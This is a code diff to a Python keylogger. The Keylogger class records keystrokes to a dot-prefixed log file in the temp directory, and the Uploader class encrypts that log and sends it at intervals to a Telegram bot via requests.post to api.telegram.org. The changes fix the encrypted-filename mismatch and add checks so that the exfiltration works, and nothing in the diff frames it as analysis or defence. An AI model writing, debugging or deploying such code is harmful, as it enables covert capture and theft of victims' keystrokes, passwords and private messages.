@@ -42,7 +42,6 @@ def alarm(msg) -> None:
 
 # Keystroke record
 class Keylogger:
-
     def __init__(self) -> None:
         self.duplicate = ['']
         self.filename = join(gettempdir(), f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
@@ -103,9 +102,8 @@ class Keylogger:
 
 # Send the file to Telegram at regular intervals
 class Uploader:
-
     def __init__(self) -> None:
-        self.encrypted_filename = join(gettempdir(), f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.enc')
+        self.encrypted_filename = f'{FILENAME}.enc'  # Use the correct encrypted file name
 
     def encrypt_file(self, filename: str) -> None:
         try:
@@ -113,6 +111,7 @@ class Uploader:
                 print(f"Error: File {filename} does not exist.")  # Debug: Print error if file is missing
                 return
 
+            print(f"Encrypting file: {filename}")  # Debug: Print the file being encrypted
             with open(filename, 'rb') as f:
                 data = f.read()
             encrypted_data = cipher_suite.encrypt(data)
@@ -129,15 +128,17 @@ class Uploader:
             try:
                 if exists(FILENAME):
                     self.encrypt_file(FILENAME)
-                    with open(ENCRYPTED_FILENAME, 'rb') as fh:
-                        files = {'document': fh}
-                        resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}', files=files)
+                    if exists(self.encrypted_filename):  # Check if the encrypted file exists
+                        with open(self.encrypted_filename, 'rb') as fh:
+                            files = {'document': fh}
+                            resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}', files=files)
 
-                        if resp.status_code != 200:
-                            alarm(f'Error code: {resp.status_code}')
-
+                            if resp.status_code != 200:
+                                alarm(f'Error code: {resp.status_code}')
+                    else:
+                        alarm(f'Encrypted file not found: {self.encrypted_filename}')
                 else:
-                    alarm(f'File not created or found!')
+                    alarm(f'Log file not found: {FILENAME}')
 
                 sleep(INTERVAL)
 
